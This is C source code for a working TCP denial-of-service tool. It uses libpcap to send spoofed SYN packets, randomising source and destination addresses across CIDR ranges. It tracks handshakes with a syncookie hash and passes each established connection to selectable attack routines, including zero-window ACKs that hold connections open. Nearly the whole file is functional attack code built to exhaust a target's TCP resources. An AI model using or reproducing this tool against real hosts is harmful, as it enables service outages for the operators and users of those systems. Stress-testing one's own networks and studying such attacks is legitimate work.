#include "config.h"
#include "ext/makepkt.h"
#include "ext/tcphash.h"
#include "ext/packet_slice.h"
#include "ext/rbtree.h"
#include "ext/xmalloc.h"
#include "ext/packets.h"
#include "ext/xdelay.h"
#include "getroutes.h"
#include "arp.h"
#include "misc.h"
#include "main.h"
#include "attacks.h"

#define OPT_STR	"a:Ac:d:hH:m:M:p:r:s:vw:"
#define DEF_PPS	300

#define INTTOMASK(mnum_in, m_out) \
	{ \
		int jm=0; \
		for (jm=0, m_out=0; jm < (mnum_in); jm++) { \
                        m_out=(m_out) >> 1 | 0x80000000; \
                } \
	}

int verbose=0, ack_alot=0;
uint8_t delay_type=0, delay_tset=0, ea[6], gwmac[6];
char pcap_errors[PCAP_ERRBUF_SIZE];
unsigned int connections=0, max_conns=DEF_MAX_CONNS, fl_off=0;
uint32_t intf_net=0, intf_mask=0, tickcnt=0;
func_list_t **fl=NULL;
pcap_t *pdev=NULL;

static uint8_t mycidr=32;
static char *ibuf, myaddrstr_l[128], myaddrstr_h[128], *rport_str=NULL, umac=0;
/*
 * oddity, we ignore the WS tcpopt for ourselves to simplify the code
 */
uint16_t mywindow=DEF_WINDOW_SIZE;
static unsigned short int remote_port[128], rport_off=0;
static int done=0, children=0;
static unsigned int syns=0, max_syns=DEF_MAX_SYNS, pps=DEF_PPS;
static time_t time_old=0, time_new=0;
static uint32_t myaddr=0, syncookie=0, mymask=0;
static void *statetbl=NULL; /* not used but here in case you want to tinker */
static float cps=0;
static void (*do_stress)(
		uint32_t, uint32_t, uint16_t, uint16_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, int
		)=NULL;

static void do_ack(uint32_t, uint32_t, uint16_t, uint16_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, int);

void update_tickcnt(void);

static void handle_ctrlc(int );
static void do_connections(struct sockaddr_in *, struct sockaddr_in *);
static int make_synpacket(const struct sockaddr_in *, const struct sockaddr_in *, size_t *, const uint8_t **);
static void process_packet(uint8_t *, const struct pcap_pkthdr *, const uint8_t *);
static void usage(void) __attribute__((noreturn));
static const inline char *get_tcpoptstr(uint8_t /* tcpoption */);
static void do_socket(void) __attribute__((noreturn));
static void get_tcpopts(
			const uint8_t * /* data		*/,
			size_t		/* data length	*/,
			uint8_t *	/* window scale */,
			uint32_t *	/* timestamp 1	*/,
			uint32_t *	/* timestamp 2	*/,
			int *		/* got timestamp*/,
			uint16_t *	/* mss		*/
		);
/*
 * randomly selects the attack functions
 */
static void do_random_stress(
			uint32_t /* network order remote host	*/,
			uint32_t /* network order local host	*/,
			uint16_t /* network order remote port	*/,
			uint16_t /* network order local port	*/,
			uint32_t /* HOST order remote window	*/,
			uint32_t /* network order local seq #	*/,
			uint32_t /* network order remote seq #	*/,
			uint32_t /* timestamp 1 from remote	*/,
			uint32_t /* timestamp 2 from remote	*/,
			int      /* got timestamps at all	*/
		);

static struct {
	uint8_t tcpopt;
	const char *name;
} tcpopts_tbl[]={
{TCPOPT_NOP,		"NOP"		},
{TCPOPT_EOL,		"EOL"		},
{TCPOPT_MAXSEG,		"MSS"		},
{TCPOPT_SACK_PERMITTED,	"SACKOK"	},
{TCPOPT_SACK,		"SACK"		},
{TCPOPT_TIMESTAMP,	"TS"		},
{TCPOPT_WINDOW,		"WS"		},
{0,		NULL}
};

static void usage(void) {
	ERR("Usage: %s (%s) (remote host)\n"
		"\t-a	*arp table size\n"
		"\t-A	 ACK a lot of things (keep 0 windows open for example)\n"
		"\t-c	*connections to make (-1 for no limit, default %d)\n"
		"\t-d	*remote host\n"
		"\t-h	 help\n"
		"\t-H	*mac address to use (default, ask nic card)\n"
		"\t-m	*max syns to send (-1 for no limit, default %d\n"
		"\t-M	*method for tcp DoS, -M? for list\n"
		"\t-p	*remote port (default %s)\n"
		"\t-r	*pps %u\n"
		"\t-s	*source IP address (use fantaip to get this, or similar)\n"
		"\t-v	 verbose\n"
		"\t-w	*window size",
		PROGNAME, OPT_STR, DEF_MAX_CONNS, DEF_MAX_SYNS, DEF_RPORT_STR, DEF_PPS
	);

	exit(0);
}

int main(int argc, char **argv) {
	const char *target=NULL;
	char *tptr=NULL;
	uint8_t ethdest[6];
	uint16_t u_mac[6];
	int copt=0, arptbl_sz=DEF_ARPTBL_SIZE;
	unsigned int ju=0;
	struct sockaddr_in tgt, tgtmask, myaddr_s;
	struct hostent *he=NULL;
	struct in_addr sip;
	pid_t chldpid=0;
	struct sockaddr *gwip=NULL;
	pcap_if_t *pif=NULL, *walk=NULL;
	struct pcap_addr *pa=NULL;
	int intf_found=0;

	verbose=0;

	srand(getpid());

	syncookie=(uint32_t)rand();
	update_tickcnt();

	delay_setdef(DEF_PPS);

	time(&time_old);

	fl=(func_list_t **)xmalloc(sizeof(func_list_t *) * MAX_FUNC_LIST_SIZE);
	memset(fl, 0, sizeof(func_list_t *) * MAX_FUNC_LIST_SIZE);

#define ADD_FUNC(__fp, __fname, __opt) \
	assert(fl_off < MAX_FUNC_LIST_SIZE); \
	fl[fl_off]=xmalloc(sizeof(func_list_t)); \
	fl[fl_off]->name=__fname; \
	fl[fl_off]->opt=__opt; \
	fl[fl_off]->fp=__fp; \
	fl_off++

	init_attacks();

	/* MUST BE LAST */
	ADD_FUNC(do_random_stress, "randomly select one of the functions available", 'r');

	memset(&remote_port[0], 0, sizeof(remote_port) * sizeof(remote_port[0]));
	remote_port[0]=DEF_RPORT;
	rport_str=xstrdup(DEF_RPORT_STR);

#undef ADD_FUNC

	ack_alot=0;

	do_stress=fl[0]->fp;

	/*
	 * the state table is not used in this code, but in case you want to play with certain things
	 * its here
	 */
	statetbl=rbinit(111);

	while ((copt=getopt(argc, argv, OPT_STR)) != -1) {
		switch (copt) {
			case 'a':
				arptbl_sz=atoi(optarg);
				break;

			case 'A':
				ack_alot=1;
				break;

			case 'c':
				max_conns=atoi(optarg);
				break;

			case 'd':
				target=optarg;
				break;

			case 'H':
				umac=1;
				if (sscanf(optarg, "%hx:%hx:%hx:%hx:%hx:%hx", &u_mac[0], &u_mac[1], &u_mac[2], &u_mac[3], &u_mac[4], &u_mac[5]) != 6) {
					ERR("bad mac address `%s'", optarg);
					exit(1);
				}
				ea[0]=(uint8_t )u_mac[0] & 0xff;
				ea[1]=(uint8_t )u_mac[1] & 0xff;
				ea[2]=(uint8_t )u_mac[2] & 0xff;
				ea[3]=(uint8_t )u_mac[3] & 0xff;
				ea[4]=(uint8_t )u_mac[4] & 0xff;
				ea[5]=(uint8_t )u_mac[5] & 0xff;
				break;

			case 'm':
				max_syns=atoi(optarg);
				break;

			case 'M':
				do_stress=NULL;
				for (ju=0; ju < fl_off && fl[ju] != NULL; ju++) {
					if (fl[ju]->opt == optarg[0]) {
						do_stress=fl[ju]->fp;
						break;
					}
				}

				if (do_stress == NULL) {
					if (optarg[0] != '?') {
						ERR("no such function `%c', see below for a valid list", optarg[0]);
					}
					for (ju=0; ju < fl_off && fl[ju] != NULL; ju++) {
						ERR("\tFunction `%c': %s", fl[ju]->opt, fl[ju]->name);
					}
					exit(1);
				}
				break;

			case 'p':
				if (strstr(optarg, ",") != NULL) {
					char *tok=NULL;

					if (rport_str) {
						xfree(rport_str);
					}
					rport_str=xstrdup(optarg);

					for (tok=strtok(optarg, ","); tok != NULL; tok=strtok(NULL, ",")) {
						if (sscanf(tok, "%hu", &remote_port[rport_off++]) != 1) {
							ERR("dont understand port `%s'", tok);
							exit(1);
						}
						assert(rport_off < sizeof(remote_port));
					}
					break;
				}

				if (sscanf(optarg, "%hu", &remote_port[0]) != 1) {
					ERR("dont understand port `%s'", optarg);
					exit(1);
				}
				rport_off=1;
				break;

			case 'r':
				if (sscanf(optarg, "%u", &pps) != 1) {
					ERR("bad packet per second value");
					exit(1);
				}
				delay_setdef(pps);
				break;

			case 's':
				if ((tptr=strrchr(optarg, '/')) != NULL && strlen(tptr) > 1) {
					*tptr='\0';
					tptr++;

					if (atoi(tptr) == 0) {
						mymask=0xffffffffU;
					}
					else {
						mycidr=(uint8_t )atoi(tptr);
						INTTOMASK(mycidr, mymask);
					}
					DBG("tptr is `%s' mask %08x", tptr, mymask);
				}
				else {
					mymask=0xffffffffU;
				}
				if (inet_aton(optarg, &sip) == 0) {
					ERR("bad source IP address");
					exit(1);
				}
				myaddr=htonl(sip.s_addr);
				break;

			case 'v':
				verbose++;
				break;

			case 'w':
				mywindow=atoi(optarg);
				break;

			case 'h':
			default:
				usage();
				break;
		}
	}

	if (target == NULL) {
		if (optind < argc) {
			target=argv[optind];
		}
		else {
			ERR("sorry, i require a target");
			exit(1);
		}
	}
	optind++;

	if (optind < argc) {
		ERR("extra stuff at command line ignored");
	}

	init_tslot(pps, delay_type);

	tgtmask.sin_family=AF_INET;
	tgtmask.sin_port=0;

	tptr=strrchr(target, '/');
	if (tptr != NULL) {

		*tptr='\0';
		tptr++;

		INTTOMASK(atoi(tptr), tgtmask.sin_addr.s_addr);
	}
	else {
		tgtmask.sin_addr.s_addr=0xffffffffU;
	}

	he=gethostbyname(target);
	if (he == NULL) {
		ERR("cant resolve `%s': %s", target, hstrerror(h_errno));
		exit(1);
	}

	if (he->h_addrtype != AF_INET) {
		ERR("only ipv4 is supported");
		exit(1);
	}

	memcpy(&tgt.sin_addr.s_addr, he->h_addr_list[0], sizeof(struct in_addr));
	tgt.sin_port=0;
	tgt.sin_family=AF_INET;

	arp_init(arptbl_sz);

	if (getroutes(&ibuf, (struct sockaddr *)&tgt, (struct sockaddr **)&gwip) < 0) {
		ERR("no route to host");
		exit(1);
	}

	if (gwip != NULL) {
		printf("[+] using interface `%s' to get at %s via gateway %s\n",
			ibuf, INT_NTOA(tgt.sin_addr.s_addr), sockaddrstr(gwip)
		);
	}
	else {
		printf("[+] using interface `%s' to get at %s\n",
			ibuf, INT_NTOA(tgt.sin_addr.s_addr)
		);
	}

	if (pcap_findalldevs(&pif, pcap_errors) < 0) {
		ERR("pcap findalldevs fails: %s", pcap_errors);
		exit(0);
	}

	for (walk=pif; walk != NULL; walk=walk->next) {
		assert(walk->name != NULL && strlen(walk->name) > 0);
		if (strcmp(walk->name, ibuf) == 0) {
			sa_u myhw_u, myip_u;

			DBG("using interface `%s' description `%s'", walk->name, walk->description != NULL ? walk->description : "No Description available");
			for (pa=walk->addresses; pa != NULL; pa=pa->next) {
				myhw_u.s=pa->addr;
				myip_u.s=pa->addr;

				if (myhw_u.fs->family == AF_PACKET && umac == 0) {
					if (myhw_u.sl->sll_halen != 6) {
						ERR("not ethernet?!");
						exit(1);
					}
					memcpy(ea, myhw_u.sl->sll_addr, sizeof(ea));
					intf_found=1;
				}
				else if (umac == 1) {
					intf_found=1;
				}
				else if (myip_u.fs->family == AF_INET && myaddr == 0) {
					myaddr=htonl(myip_u.sin->sin_addr.s_addr);
					mymask=0xffffffffU;
				}
			}
		}
	}

	if (intf_found == 0) {
		ERR("cant find the interface that was in the routing table!");
		exit(1);
	}

	sip.s_addr=ntohl(myaddr & mymask);
	sprintf(myaddrstr_l, "%s", inet_ntoa(sip));

	sip.s_addr=ntohl(myaddr | ~(mymask));
	sprintf(myaddrstr_h, "%s", inet_ntoa(sip));

	myaddr_s.sin_addr.s_addr=myaddr;
	myaddr_s.sin_family=AF_INET;

	pdev=pcap_open_live(ibuf, 0xffff, 1, 0, pcap_errors);
	if (pdev == NULL) {
		ERR("pcap_open_live fails with interface `%s': %s", ibuf, pcap_errors);
		exit(1);
	}

	(void )pcap_setdirection(pdev, PCAP_D_IN);

	/* this is only to filter broadcasts, it shouldnt matter if it fails at all */
	if (pcap_lookupnet(ibuf, &intf_net, &intf_mask, pcap_errors) == -1) {
		ERR("pcap_lookupnet fails (but we dont really care anyhow): %s", pcap_errors);
	}

	if (mymask == 0xffffffffU) {
		printf("[+] my ip address is `%s'\n", myaddrstr_l);
	}
	else {
		printf("[+] my ip address is `%s' -> `%s'\n", myaddrstr_l, myaddrstr_h);
	}

	printf("[+] my mac is %02x:%02x:%02x:%02x:%02x:%02x\n", ea[0], ea[1], ea[2], ea[3], ea[4], ea[5]);

	if (arp_request(gwip != NULL ? gwip : (struct sockaddr *)&tgt, (struct sockaddr *)&myaddr_s, ea, ethdest, pdev) != 1) {
		ERR("cant get mac address for `%s'", gwip != NULL ? "gateway" : "target");
		exit(1);
	}

	memcpy(gwmac, ethdest, 6);
	printf("[+] NextHop MAC address is %02x:%02x:%02x:%02x:%02x:%02x\n", gwmac[0], gwmac[1], gwmac[2], gwmac[3], gwmac[4], gwmac[5]);

	printf("[+] connecting to %s [%s:%s] window of %d)\n", target, inet_ntoa(tgt.sin_addr), rport_str, mywindow);

	signal(SIGCHLD, handle_ctrlc);

	children++;

	switch ((chldpid=fork())) {
		case -1:
			ERR("cant fork!: %s", strerror(errno));
			exit(1);
			break;

		case 0:
			signal(SIGINT, SIG_IGN);
			do_socket();
			break;
	}

	/* child loop */

	sleep(1);

	signal(SIGINT, handle_ctrlc);

	printf("[+] child pid is %zu\n", (size_t) chldpid);

	do_connections(&tgt, &tgtmask);

	printf("[+] Closing ethernet interface `%s'\n", ibuf);

	pcap_close(pdev);

	printf("[+] Exiting\n");

	if (children > 0) {
		int status=0;

		assert(chldpid > 100);

		kill(chldpid, SIGTERM);

		wait(&status);

	}

	rbdestroy(statetbl);

	exit(0);
}

void update_tickcnt(void) {
	/* 1024 p sec? */
	struct timeval tvold, tvnow;

	if (tickcnt == 0) {
		gettimeofday(&tvold, NULL);

		tickcnt=(uint32_t )rand();

		return;
	}

	gettimeofday(&tvnow, NULL);

	tickcnt += 1024;

	return;
}

static void handle_ctrlc(int signo) {

	done++;

	if (signo == SIGCHLD) {
		children--;
	}

	if (done == 1) {
		printf("\n[+] breaking out of socket loop\n");
	}
}

			/*  mss 1460,          sackOK,    timestamp 0 0,                             nop,   wscale 2	*/
static uint8_t *tcpopts_tpl="\x02\x04\x05\xb4" "\x04\x02" "\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00" "\x01" "\x03\x03\x02";
static const int tcpopts_len=20, ts_off=8;


#if 0
!!! this is what we are mimicking (from 2.6) !!!
with:
 ts = 1
 sack = 1
 offer_wscale = 1
 
        *ptr++ = htonl((TCPOPT_MSS << 24) | (TCPOLEN_MSS << 16) | mss);
        if (ts) {
                if(sack)
                        *ptr++ = __constant_htonl((TCPOPT_SACK_PERM << 24) | (TCPOLEN_SACK_PERM << 16) |
                                                  (TCPOPT_TIMESTAMP << 8) | TCPOLEN_TIMESTAMP);
                else
                        *ptr++ = __constant_htonl((TCPOPT_NOP << 24) | (TCPOPT_NOP << 16) |
                                                  (TCPOPT_TIMESTAMP << 8) | TCPOLEN_TIMESTAMP);
                *ptr++ = htonl(tstamp);         /* TSVAL */
                *ptr++ = htonl(ts_recent);      /* TSECR */
        } else if(sack)
                *ptr++ = __constant_htonl((TCPOPT_NOP << 24) | (TCPOPT_NOP << 16) |
                                          (TCPOPT_SACK_PERM << 8) | TCPOLEN_SACK_PERM);
        if (offer_wscale)
                *ptr++ = htonl((TCPOPT_NOP << 24) | (TCPOPT_WINDOW << 16) | (TCPOLEN_WINDOW << 8) | (wscale));

also note that:

#define tcp_time_stamp              ((__u32)(jiffies))
wscale defaults to 2

#endif

static int make_synpacket(const struct sockaddr_in *sin, const struct sockaddr_in *sinmask, size_t *pkt_len, const uint8_t **pkt) {
	uint16_t mysrcport=0, useport=0;
	uint32_t useaddr=myaddr, destaddr=sin->sin_addr.s_addr;
	uint32_t myseq=0;
	uint32_t *myts=0;
	static char *tcpopts=NULL;

	if (tcpopts == NULL) {
		tcpopts=xmalloc(tcpopts_len);
		memcpy(tcpopts, tcpopts_tpl, tcpopts_len);
	}

	update_tickcnt();

	myts=(uint32_t *)(tcpopts + ts_off);
	*myts=htonl(tickcnt);	/* local timestamp	*/
	myts++;
	*myts=0x0;		/* remote timestamp	*/

	mysrcport=(uint16_t)(rand() & 0xffff) | 0x1000; /* anything > 4096 */

	makepkt_clear();

	if (mymask != 0xffffffffU) {
		useaddr=myaddr | ((uint32_t)rand() & ~(mymask));
	}

	if (sinmask->sin_addr.s_addr != 0xffffffffU) {
		destaddr |= ((uint32_t)rand() & htonl(~(sinmask->sin_addr.s_addr)));
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return -1;
	}

	useport=remote_port[rport_off != 0 ? (rand() % rport_off) : 0];

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x40				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			htonl(useaddr)			/* source		*/,
			destaddr			/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return -1;
	}

	TCPHASHTRACK(myseq, destaddr, mysrcport, useport, syncookie);

	if (makepkt_build_tcp(
			mysrcport			/* local_port		*/,
			useport				/* remote port		*/,
			0				/* chksum		*/,
			myseq				/* seq			*/,
			0U				/* ack seq		*/,
			TH_SYN				/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return -1;
	}

	return makepkt_getbuf(pkt_len, pkt);
}

static void do_random_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	unsigned int rnd=rand() %  (fl_off - 1);

	DBG("USE %u at %p", rnd, fl[rnd]->fp);

	fl[rnd]->fp(rhost, lhost, rport, lport, ho_rwindow, lseq, rseq, ts1, ts2, got_ts);

	return;
}

static void do_connections(struct sockaddr_in *sin, struct sockaddr_in *sinmask) {
	ssize_t ssize=-1;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	time_t start=0, end=0;
	float sps=0.0;

	printf("[+] attacking a cidr %08x\n", sinmask->sin_addr.s_addr);

	for (time(&start); done == 0; ) {

		start_tslot();

		if (make_synpacket(sin, sinmask, &packet_len, &packet) < 0) {
			ERR("cant create packet!");
			done=1;
			break;
		}

		ssize=pcap_sendpacket(pdev, packet, packet_len);
		if (ssize != 0) {
			ERR("cant transmit packet, %zd was send size", ssize);
			done=1;
			break;
		}
		syns++;
		if (syns >= max_syns) {
			break;
		}

		end_tslot();
	}

	time(&end);

	if (syns && (end - start) > 0) {
		sps=(float )syns / (float )(end - start);
	}
	else {
		sps=0.0;
	}

	printf("[+] sent %u total syn packets at %.02f pps\n", syns, sps);
	sleep(5);

	return;
}

static void do_socket(void) {
	struct bpf_program filter;
	char pcap_filter[1024];

	if (mymask == 0xffffffffU) {
		sprintf(pcap_filter, "tcp and dst %s", myaddrstr_l);
	}
	else {
		sprintf(pcap_filter, "tcp and dst net %s/%u", myaddrstr_l, mycidr);
	}

	printf("[+] pcap filter `%s' on interface `%s'\n", pcap_filter, ibuf);

	pcap_errors[0]='\0';

	if (pcap_compile(pdev, &filter, pcap_filter, 0, intf_net) < 0) {
		ERR("cant compile pcap filter");
		exit(1);
	}

	if (pcap_setfilter(pdev, &filter) < 0) {
		ERR("cant set filter");
		exit(1);
	}

	pcap_freecode(&filter);

	pcap_loop(pdev, 0, &process_packet, NULL);

	exit(0);
}

static void process_packet(uint8_t *userdata, const struct pcap_pkthdr *phdr, const uint8_t *packet) {
	packetlayers_t plt[8];
	size_t plsz=0, j=0;
	union {
		const uint8_t *p;
		const struct myiphdr *i;
		const struct mytcphdr *t;
	} d_u;
	struct in_addr ia, myia;
	size_t llen=0;
	uint16_t myport=0, srvport=0, mss=0;
	uint32_t lseq=0, hseq=0, rwindow=0, myseq=0, remseq=0, ts1=0, ts2=0;
	int got_ts=0;
	uint8_t ws=0;

	plsz=packet_slice(packet, phdr->caplen, &plt[0], 8, PKLTYPE_ETH);

	for (j=0; j < plsz; j++) {
		d_u.p=plt[j].ptr;
		llen=plt[j].len;

		if (plt[j].stat != 0) {
			ERR("bad packet at layer `%zu'", j);
			return;
		}

		switch (plt[j].type) {
			case PKLTYPE_ETH:
				break;

			case PKLTYPE_IP:
				assert(llen >= sizeof(struct myiphdr));
				if ((ntohs(d_u.i->frag_off) & IP_OFFMASK) != 0) {
					return;
				}
				myia.s_addr=d_u.i->daddr;
				ia.s_addr=d_u.i->saddr;
				break;

			case PKLTYPE_TCP:
				assert(llen >= sizeof(struct mytcphdr));
				srvport=d_u.t->source;
				myport=d_u.t->dest;
				rwindow=(uint32_t )ntohs(d_u.t->window);

				TCPHASHTRACK(lseq, ntohl(ia.s_addr), ntohs(myport), ntohs(srvport), syncookie);
				hseq=lseq + mywindow;

				myseq=d_u.t->ack_seq;
				remseq=d_u.t->seq;

				if (SEQ_WITHIN(ntohl(d_u.t->ack_seq), lseq, hseq)) {
					DBG("within our window of %u (%08x lower %08x higher %08x)", mywindow, ntohl(d_u.t->ack_seq), lseq, hseq);
				}
				else {
					DBG("OUTSIDE our window of %u (%08x lower %08x higher %08x)", mywindow, ntohl(d_u.t->ack_seq), lseq, hseq);
					return;
				}

				/* get rid of the weirdos */
				if (d_u.t->rst == 1 || d_u.t->fin == 1 || d_u.t->psh == 1) {
					return;
				}

				/* i actually dont care about the ACK here, perhaps the packets crossed on the wire ;] j/k */
				if (d_u.t->syn != 1) {
					if (d_u.t->ack == 1 && ack_alot) {
						DBG("ack probe? with rst %d fin %d psh %d and ack %d syn %d\n", d_u.t->rst, d_u.t->fin, d_u.t->psh, d_u.t->ack, d_u.t->syn);
						do_ack(ia.s_addr, myia.s_addr, srvport, myport, rwindow, myseq, remseq, ts1, ts2, got_ts);
					}
					return;
				}

				break;

			case PKLTYPE_TCPOP:
				get_tcpopts(d_u.p, llen, &ws, &ts1, &ts2, &got_ts, &mss);
				break;

			default:
				DBG("bad layer %d", plt[j].type);
				break;
		}
	}

	if (ws > 0) {
		rwindow <<= ws;
	}

	DBG("IP src %s:%hu from local %hu with window %u (scale %hu) lseq %08x rseq %08x ts1 %08x ts2 %08x mss %hu", inet_ntoa(ia), ntohs(srvport), ntohs(myport), rwindow, ws, ntohl(myseq), ntohl(remseq), ts1, ts2, ntohs(mss));

	do_stress(ia.s_addr, myia.s_addr, srvport, myport, rwindow, myseq, remseq, ts1, ts2, got_ts);

	if (connections % 500 == 0) {
		int tdiff=0;

		time_new=time(NULL);

		tdiff=time_new - time_old;

		cps=(float )((float )connections / (float )tdiff);

		printf("\r%.02f cps %u total", cps, connections);
		fflush(stdout);
	}

	return;
}

static void get_tcpopts(const uint8_t *data, size_t data_len, uint8_t *ws, uint32_t *ts1, uint32_t *ts2, int *got_ts, uint16_t *mss) {
	const uint8_t *end=data + data_len;

	*ws=0;
	*ts1=*ts2=0;
	*mss=0;
	*got_ts=0;

	if (data_len < 1) {
		return;
	}

	for (;;) {
		DBG("TCPOPT %s", get_tcpoptstr(*data));
		switch (*data) {
			case TCPOPT_EOL:
				return;
				break;

			case TCPOPT_NOP:
				data++;
				break;

			case TCPOPT_MAXSEG:
				if (data + 4 > end) {
					return;
				}
				data++;
				if (*data != 4) {
					return;
				}
				data++;
				*mss=*(const uint16_t *)data;
				data += 2;
				break;

			case TCPOPT_SACK_PERMITTED:
				data += 2;
				break;

			case TCPOPT_TIMESTAMP:
				if ((data + 10) > end) {
					return;
				}
				data++;
				if (*data != 0x0a) {
					return;
				}
				*got_ts=1;
				data++;
				*ts1=*(const uint32_t *)data;
				data += 4;
				*ts2=*(const uint32_t *)data;
				data += 4;
				break;

			case TCPOPT_WINDOW:
				if ((data + 3) > end) {
					return;
				}
				data += 2;
				*ws=*data;
				data++;
				break;

			default:
				return;
				break;
		}

		if (data >= end) {
			return;
		}
	}

	return;
}

static const inline char *get_tcpoptstr(uint8_t tcpopt) {
	static char ustr[128];
	uint8_t j=0;

	for (j=0; tcpopts_tbl[j].name != NULL; j++) {
		if (tcpopts_tbl[j].tcpopt == tcpopt) {
			return tcpopts_tbl[j].name;
		}
	}

	sprintf(ustr, "Unknown %02x", tcpopt);

	return ustr;
}

void do_ack(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.w=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq)			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			0				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	return;
}
